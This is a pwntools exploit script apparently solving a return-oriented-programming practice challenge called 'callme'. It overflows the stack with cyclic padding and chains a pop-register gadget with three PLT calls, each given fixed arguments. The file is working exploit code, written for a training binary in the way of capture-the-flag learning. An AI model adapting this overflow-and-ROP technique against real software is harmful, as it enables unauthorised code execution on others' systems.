#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./callme_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616b)

# (r2) iS - to print sections adresses
# (r2) pd @ 0x4006c0 - to print .plt section
CALLME_1_PLT = p64(0x400720)
CALLME_2_PLT = p64(0x400740)
CALLME_3_PLT = p64(0x4006f0)

# ROPgadget --binary ./callme
POP_RDI_RSI_RDX = p64(0x40093c)

ARG_1 = p64(0xdeadbeefdeadbeef)
ARG_2 = p64(0xcafebabecafebabe)
ARG_3 = p64(0xd00df00dd00df00d)

ARGS = ARG_1 + ARG_2 + ARG_3

payload = padding + POP_RDI_RSI_RDX + ARGS
payload += CALLME_1_PLT

payload += POP_RDI_RSI_RDX + ARGS
payload += CALLME_2_PLT

payload += POP_RDI_RSI_RDX + ARGS
payload += CALLME_3_PLT

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
